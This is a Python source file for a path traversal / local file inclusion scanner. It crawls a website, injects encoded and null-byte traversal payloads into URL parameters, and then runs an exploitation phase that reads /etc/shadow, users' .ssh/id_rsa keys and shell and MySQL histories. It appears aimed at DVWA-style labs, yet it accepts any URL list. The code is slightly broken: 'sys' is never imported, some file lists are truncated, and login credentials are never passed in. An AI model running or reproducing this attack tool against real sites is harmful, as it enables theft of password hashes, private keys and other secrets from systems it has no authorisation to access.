import argparse
import requests
import urllib3
import json
import csv
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Disable SSL/TLS warnings for easier debugging
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class LFIScanner:
    def __init__(self, proxy=None, threads=10, wordlist=None, username=None, password=None, cookies=None):
        """Initialize scanner with configuration
        - proxy: Set up proxy for traffic inspection
        - threads: Control parallel request count
        - payloads: List of path traversal test patterns
        - vulnerabilities: Store found vulnerabilities
        - exploit_files: Target files for post-discovery exploitation"""
        self.auth_credentials = (username, password)
        self.login_url = "http://localhost/login.php"
        self.unique_vulns = set()
        self.unique_entries = set()
        self.cookies = cookies
        self.session = self._create_session(proxy)  
        self.tested_combinations = set()
        self.visited_urls = set()
        self.payloads = self._generate_payloads()
        self.vulnerabilities = []
        self.base_domain = None
        self.threads = threads
        self.executor = ThreadPoolExecutor(max_workers=threads)
        self.exploitation_results = []
        self.exploit_files = [  # Target files for exploitation phase
            '/etc/passwd', '/etc/shadow', '/etc/hosts', # ... full list
        ]
        if wordlist:
            self._load_wordlist(wordlist)
        self.user_file_patterns = [
            '.bash_history',
            '.ssh/id_rsa',
            '.ssh/authorized_keys',
            '.mysql_history',
            # ... full list from user input
        ]
    def _load_wordlist(self, wordlist_path):
        """Load custom file paths for exploitation"""
        try:
            with open(wordlist_path) as f:
                custom_files = [
                    line.strip() 
                    for line in f 
                    if line.strip() and not line.startswith('#')
                ]
                # Normalize paths and ensure absolute format
                normalized = [
                    f'/{path.lstrip("/")}' if not path.startswith('/') else path
                    for path in custom_files
                ]
                self.exploit_files.extend(normalized)
                # Remove duplicates while preserving order
                seen = set()
                self.exploit_files = [
                    x for x in self.exploit_files 
                    if not (x in seen or seen.add(x))
                ]
        except Exception as e:
            print(f"[!] Wordlist error: {str(e)}")
            sys.exit(1)
            
    def _add_entry(self, entry):
        """Universal deduplication for all result types"""
        entry_hash = hash(frozenset({
            'url': entry.get('url'),
            'parameter': entry.get('parameter'),
            'payload': unquote(entry.get('payload', '')),
            'target_file': entry.get('target_file', ''),
            'type': entry.get('type', 'discovery')
        }.items()))

        if entry_hash not in self.unique_entries:
            self.unique_entries.add(entry_hash)
            if entry.get('type') == 'exploitation':
                self.exploitation_results.append(entry)
            else:
                self.vulnerabilities.append(entry)


    def _add_vulnerability(self, entry):
        """Deduplicate entries using a unique hash"""
        vuln_hash = hash(frozenset({
            'url': entry['url'],
            'parameter': entry['parameter'],
            'payload': unquote(entry['payload']),
            'target_file': entry.get('target_file', '')
        }.items()))
        
        if vuln_hash not in self.unique_vulns:
            self.unique_vulns.add(vuln_hash)
            self.vulnerabilities.append(entry)

    def _authenticate(self):
        """Handle DVWA-style authentication"""
        login_data = {
            'username': self.auth_credentials[0],
            'password': self.auth_credentials[1],
            'Login': 'Login'
        }
        
        # Get CSRF token
        response = self.session.get(self.login_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'user_token'}).get('value')
        
        # Add CSRF token to login data
        login_data['user_token'] = csrf_token
        
        # Post login request
        response = self.session.post(self.login_url, data=login_data)
        
        # Verify login success
        if "Login failed" in response.text:
            raise Exception("Authentication failed")
        

    def _create_session(self, proxy):
        """Configure HTTP session with retries and headers
        - Sets up connection pooling and retry logic
        - Adds browser-like User-Agent header
        - Configures proxy if provided"""
        session = requests.Session()
        session.verify = False  # Disable SSL verification
        # Configure automatic retries for failed requests
        retries = Retry(total=3, backoff_factor=1,
                       status_forcelist=[500, 502, 503, 504])
        session.mount('https://', HTTPAdapter(max_retries=retries))
        session.mount('http://', HTTPAdapter(max_retries=retries))
        # Set headers to mimic regular browser traffic

        session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        # # Temporary hardcoded cookies (remove after testing)
        # session.headers['Cookie'] = 'PHPSESSID=4st6e8jg91sskb0tu3eoot9ir5; security=low'    
            

         # Add custom cookies if provided
        if self.cookies:
            cookie_dict = {}
            for cookie in self.cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookie_dict[name] = value
            session.headers['Cookie'] = '; '.join([f'{k}={v}' for k,v in cookie_dict.items()])

        if proxy:  # Proxy configuration
            if not proxy.startswith(('http://', 'https://')):
                proxy = f'http://{proxy}'
            session.proxies = {'http': proxy, 'https': proxy}
        return session

    def _generate_payloads(self):
        """Create path traversal payload variations
        - Includes different encoding styles
        - Null byte termination for extension bypass
        - Windows/Unix path variations
        - Double encoding and unicode bypass attempts"""
        base_paths = [
            # Basic directory traversal patterns
            '/etc/passwd', '../etc/passwd', '../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '....\/....\/....\/etc/passwd',
            # Encoded payload variations
            '%2e%2e%2f' * 6 + 'etc/passwd',
            '%252e%252e%252f' * 6 + 'etc/passwd',
            # Windows path variations
            '..\\..\\..\\..\\windows\\win.ini'.replace('\\', quote('\\')),
            '..%255c..%255c..%255cwindows%255cwin.ini',
            # File extension bypass
            '../../../etc/passwd%00.png',
            '../../../etc/passwd%00.jpg',
            # Null byte termination
            '../../../../etc/passwd%00',
            '../../../../etc/passwd%2500',
            # Start path validation bypass
            '/var/www/images/../../../etc/passwd',

        ]


        # Generate encoded versions of all base payloads
        encoded_paths = [quote(payload, safe='') for payload in base_paths]
        # Add unicode-based bypass attempts
        unicode_paths = [
            '..%c0%af..%c0%af..%c0%afetc/passwd',  # URL-encoded backslash
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd'  # Fullwidth slash
        ]
        return list(set(base_paths + encoded_paths + unicode_paths))

    def scan(self, start_url):
        """Main scanning workflow controller
        1. Set base domain for same-domain crawling
        2. Start URL crawling and parameter discovery
        3. Launch exploitation phase after initial scan"""
        if self.auth_credentials[0]:
            self._authenticate()
        self.base_domain = urlparse(start_url).netloc
        self._crawl(start_url)
        self._exploit_vulnerabilities()
        return self.vulnerabilities + self.exploitation_results

    def _exploit_vulnerabilities(self):
        """Launch exploitation phase after initial scan with deduplication"""
        """Post-discovery exploitation phase
        - Uses found vulnerabilities to test additional files
        - Threaded execution for speed
        - Tests each vulnerable parameter against all target files"""
        if not self.vulnerabilities:
            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for vuln in self.vulnerabilities:
                for target_file in self.exploit_files:
                    futures.append(executor.submit(
                        self._test_exploit,
                        vuln['url'], vuln['parameter'], 
                        vuln['payload'], target_file
                    ))

            for future in as_completed(futures):
                if result := future.result():
                    self.exploitation_results.append(result)


    def _test_exploit(self, original_url, param, base_payload, target_file):
        """Test specific file exploitation
        - Generates modified payload for target file
        - Sends crafted request
        - Validates successful file read"""
        try:
            exploit_payload = self._generate_exploit_payload(base_payload, target_file)
            # Build test URL with modified payload
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            query[param] = [exploit_payload]
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in query.items()]
            )).geturl()

            response = self.session.get(test_url, timeout=15)
            if result := self._is_valid_exploitation(response):
                result_entry = {
                    'type': 'exploitation',
                    'url': test_url,
                    'parameter': param,
                    'target_file': target_file,
                    'payload': exploit_payload,
                    'content': response.text[:500] + '...' if response.text else '',
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }
                self._add_entry(result_entry) 
                return result_entry
        except Exception as e:
            print(f"[-] Exploit failed: {str(e)}")
        return None

    def _generate_exploit_payload(self, base_payload, target_file):
        """Generate exploitation payload while preserving encoding layers

        1. Calculate original payload's encoding depth
        2. Fully decode to raw traversal sequence
        3. Replace target file in decoded path
        4. Re-apply equivalent encoding layers

        Example:
        Original: %252e%252e%252fetc/passwd (double-encoded)
        -> Decoded: ../../etc/passwd
        -> Modified: ../../etc/shadow
        -> Re-encoded: %252e%252e%252fetc%252fshadow
        """


        """Generate exploitation payload by direct replacement of vulnerable path
    
        Process:
        1. URL-decode the original payload to handle any encoding
        2. Replace 'etc/passwd' with target file in decoded payload
        3. Re-encode while preserving null bytes and original structure

        Example:
        Original payload: ../../../etc/passwd%00.png
        -> Decoded: ../../../etc/passwd\x00.png
        -> Replaced: ../../../etc/shadow\x00.png
        -> Encoded: ../../../etc/shadow%00.png
        """
        # Decode payload to handle URL encoding
        decoded_payload = unquote(base_payload)
    
        # Normalize target file path
        target_path = target_file.lstrip('/')

        # Replace both possible patterns
        modified = decoded_payload.replace('etc/passwd', target_path)
        modified = modified.replace('/etc/passwd', target_path)

        # Preserve original encoding and structure
        return quote(modified)


    def _extract_target_file(self, base_payload):
        """Identify reusable traversal pattern
        - Finds common vulnerable file patterns
        - Extracts preceding traversal sequence
        - Handles different encoding formats"""
        decoded = unquote(base_payload)
        # Try common vulnerable file patterns
        for pattern in ['/etc/passwd', 'win.ini']:
            if pattern in decoded:
                return base_payload.replace(decoded, decoded.split(pattern)[0])
        # Fallback to regex extraction
        return re.sub(r'[^\/\\]*$', '', base_payload)

    def _is_valid_exploitation(self, response):
        """Validate successful file read
        - Checks HTTP status code
        - Looks for error messages in content
        - Verifies meaningful content length"""
        if response.status_code != 200:
            return False
        content = response.text.lower()
        # Common error messages to ignore
        error_indicators = ['file not found', 'permission denied']
        return not any(err in content for err in error_indicators) and bool(content)

    # Continued below with crawling and detection methods...

    def _crawl(self, url):
        """Website crawling system
        1. Maintains list of visited URLs to prevent duplicates
        2. Extracts links from page content
        3. Processes found URLs recursively
        4. Analyzes parameters on each page
        - Uses BFS algorithm with limited depth
        - Handles relative/absolute URL conversion
        - Respects same-domain restriction"""
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)

        try:
            # Fetch page content with error handling
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all link-bearing elements in HTML
            elements = soup.find_all(['a', 'form', 'link', 'script', 'img'])
            futures = []
            
            # Process each discovered element
            for element in elements:
                new_url = self._extract_url(element, url)
                if new_url and new_url not in self.visited_urls:
                    # Submit URL processing to thread pool
                    futures.append(self.executor.submit(self._process_url, new_url))

            # Immediate parameter analysis for current page
            self._analyze_parameters(url)
            
            # Process child URLs as they complete
            for future in as_completed(futures):
                future.result()

        except Exception as e:
            print(f"[-] Crawling error: {str(e)}")

    def _extract_url(self, element, base_url):
        """URL extraction and normalization
        1. Handles different HTML element types
        2. Converts relative URLs to absolute
        3. Validates same-domain restriction
        4. Cleans URL fragments and trailing slashes
        - Supports: <a>, <form>, <link>, <script>, <img>"""
        element_types = {
            'a': 'href', 'form': 'action', 
            'link': 'href', 'script': 'src', 
            'img': 'src'
        }
        attr = element_types.get(element.name)
        if not attr:
            return None

        url = element.get(attr)
        if url:
            # Convert to absolute URL and clean
            absolute_url = urljoin(base_url, url).split('#')[0]
            parsed = urlparse(absolute_url)
            
            # Enforce same-domain policy
            if parsed.netloc == self.base_domain:
                return parsed._replace(
                    path=parsed.path.rstrip('/'),  # Standardize path
                    query=parsed.query.strip()      # Clean query params
                ).geturl()
        return None

    def _process_url(self, url):
        """URL processing pipeline
        1. Parameter analysis for vulnerability testing
        2. Recursive crawling continuation
        - Ensures systematic site exploration
        - Maintains thread-safe URL tracking"""
        self._analyze_parameters(url)
        self._crawl(url)

    def _analyze_parameters(self, url):
        """Parameter discovery and testing
        1. Parse URL query parameters
        2. Generate payload tests for each parameter
        3. Threaded execution of vulnerability checks
        - Prevents duplicate tests using combination tracking
        - Handles multiple parameters per URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            futures = []
            for payload in self.payloads:
                # Unique test identifier
                combination = (parsed.path, param, payload)
                if combination not in self.tested_combinations:
                    self.tested_combinations.add(combination)
                    # Submit parameter test to thread pool
                    futures.append(self.executor.submit(
                        self._test_parameter, url, param, payload
                    ))
            
            # Collect results as they complete
            for future in as_completed(futures):
                if result := future.result():
                    self.vulnerabilities.append(result)

    def _test_parameter(self, original_url, param, payload):
        """Individual parameter test execution
        1. Builds test URL with injected payload
        2. Sends crafted request
        3. Analyzes response for vulnerability signs
        - Handles network errors gracefully
        - Returns structured vulnerability data"""
        try:
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            
            # Preserve original URL structure
            test_params = parse_qs(parsed.query)
            test_params[param] = [payload]
            
            # Construct test URL
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in test_params.items()]
            )).geturl()

            response = self.session.get(test_url, timeout=15)
            
            if self._is_vulnerable(response):
                result = {
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'os': self._detect_os(response),
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }
                self._add_entry(result)  
                return result

        except Exception as e:
            print(f"[-] Test failed: {str(e)}")
        return None

    def _is_vulnerable(self, response):
        """Vulnerability detection logic
        1. Checks HTTP status codes
        2. Looks for OS-specific content patterns
        3. Analyzes response length anomalies
        - Combines multiple detection methods
        - Reduces false positives through pattern matching"""
        content = response.text.lower()
        indicators = {
            'unix': ['root:x:', 'bin:x:', 'daemon:x:'],
            'windows': ['[boot loader]', '[extensions]'],
            'php': ['<?php', '<?='],
            'generic': ['file not found', 'permission denied']
        }
    
        # Status code filtering
        if response.status_code not in [200, 500]:
            return False

        # Content pattern matching
        for os_type, patterns in indicators.items():
            if any(p in content for p in patterns):
                return True

        # Response length heuristic
        if len(response.text) > 1000 and \
           'html' not in response.headers.get('content-type', ''):
            return True

        return False

    def _detect_os(self, response):
        """Operating system detection
        - Uses content patterns from vulnerable responses
        - Helps guide subsequent exploitation attempts
        - Supports Windows/Unix identification"""
        content = response.text.lower()
        if any(p in content for p in ['root:x:', 'bin:x:']):
            return 'unix'
        elif any(p in content for p in ['[boot loader]', '[extensions]']):
            return 'windows'
        return 'unknown'

    def _get_baseline(self, url):
        """Baseline response analysis
        - Captures normal response characteristics
        - Future use for anomaly detection
        - Currently not fully implemented"""
        try:
            response = self.session.get(url, timeout=10)
            return {
                'status': response.status_code,
                'length': len(response.text),
                'content_type': response.headers.get('content-type', '')
            }
        except Exception as e:
            print(f"[-] Baseline error: {str(e)}")
            return None
        
    def _extract_users_from_passwd(self, passwd_content):
        """Parse /etc/passwd to extract valid usernames"""
        users = []
        for line in passwd_content.split('\n'):
            if line.strip() and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) > 5:
                    username = parts[0]
                    home_dir = parts[5]
                    if home_dir.startswith('/home/'):
                        users.append({
                            'name': username,
                            'home': home_dir
                        })
        return users
    
    def _process_exploitation_results(self, result):
        """Handle special case for /etc/passwd to extract users"""
        if result['target_file'] == '/etc/passwd' and result['status'] == 200:
            users = self._extract_users_from_passwd(result['content'])
            self._generate_user_files(users)

        self.exploitation_results.append(result)

    def _generate_user_files(self, users):
        """Generate user-specific file paths for further exploitation"""
        for user in users:
            for pattern in self.user_file_patterns:
                # Convert ~/path to /home/username/path
                clean_path = pattern.replace('~/', '')
                user_path = f"{user['home']}/{clean_path}"
                if user_path not in self.exploit_files:
                    self.exploit_files.append(user_path)

        
        
def main():
    """Command-line interface and main execution flow
    1. Parse command-line arguments
    2. Initialize scanner with user configuration
    3. Execute scanning process
    4. Generate output reports
    5. Handle errors and display results"""
    
    # Configure command-line argument parser
    parser = argparse.ArgumentParser(
        description="Advanced LFI Scanner - Detect and exploit path traversal vulnerabilities",
        epilog="Example: %(prog)s -u https://example.com -p 127.0.0.1:8080 -t 20 -o json"
    )
    group = parser.add_mutually_exclusive_group(required=True)

    # Define supported command-line arguments
    group.add_argument("-u", "--url", help="Single target URL")
    group.add_argument("-l", "--url-list", help="File containing list of URLs to test")

    parser.add_argument("-w", "--wordlist", 
                  help="Custom file path wordlist for exploitation")
    parser.add_argument("-p", "--proxy", 
                      help="Proxy server for traffic inspection (e.g., Burp Suite: 127.0.0.1:8080)")
    parser.add_argument("-o", "--output", choices=['json', 'csv'], 
                      help="Generate report in specified format (JSON/CSV)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                      help="Concurrent threads for scanning (default: 10, max recommended: 50)")
    parser.add_argument("--auth-url", help="Login page URL")
    parser.add_argument("-U", "--username", help="Authentication username")
    parser.add_argument("-P", "--password", help="Authentication password")
    parser.add_argument("--cookies", 
                  help="Session cookies in 'name1=value1; name2=value2' format")
    # Parse user input
    args = parser.parse_args()

    # Validate input arguments
    if not args.url and not args.url_list:
        print("[-] Must specify either --url or --url-list")
        return
    
    # Initialize scanner with user configuration
    scanner = LFIScanner(
        proxy=args.proxy, 
        threads=args.threads,
        wordlist=args.wordlist  # Pass wordlist to scanner
    )

    # Process target URLs
    all_results = []
    try:
        if args.url:
            start_urls = [args.url]
            print(f"[*] Starting scan on {args.url} with {args.threads} threads")
        else:
            with open(args.url_list) as f:
                start_urls = [line.strip() for line in f if line.strip()]
            print(f"[*] Starting scan on {len(start_urls)} URLs from {args.url_list} with {args.threads} threads")

        for index, url in enumerate(start_urls, 1):
            # Validate URL format
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                print(f"\n[-] Skipping invalid URL (#{index}): {url}")
                continue
            
            print(f"\n[+] Scanning URL #{index}: {url}")
            try:
                results = scanner.scan(url)
                all_results.extend(results)
            except Exception as e:
                print(f"[-] Error scanning {url}: {str(e)}")
            finally:
                # Reset scanner state for next URL
                scanner.visited_urls = set()
                scanner.tested_combinations = set()
                scanner.vulnerabilities = []
                scanner.exploitation_results = []
                scanner.base_domain = None
        # Generate report after all scans
        if args.output:
            output_file = f"report.{args.output.lower()}"
            if args.output.lower() == 'json':
                with open(output_file, 'w') as f:
                    json.dump(all_results, f, indent=2)
            elif args.output.lower() == 'csv':
                with open(output_file, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['URL', 'Parameter', 'Payload', 'Status', 
                                    'Length', 'Timestamp'])
                    for vuln in all_results:
                        writer.writerow([
                            vuln.get('url'),
                            vuln.get('parameter'),
                            vuln.get('payload'),
                            vuln.get('status'),
                            vuln.get('length'),
                            vuln.get('timestamp')
                        ])
            print(f"\n[*] Report saved to {output_file}")

        print(f"\n[*] Scan complete. Found {len(all_results)} vulnerabilities across {len(start_urls)} URLs")

    except Exception as e:
        print(f"[!] Critical error: {str(e)}")
        sys.exit(1)


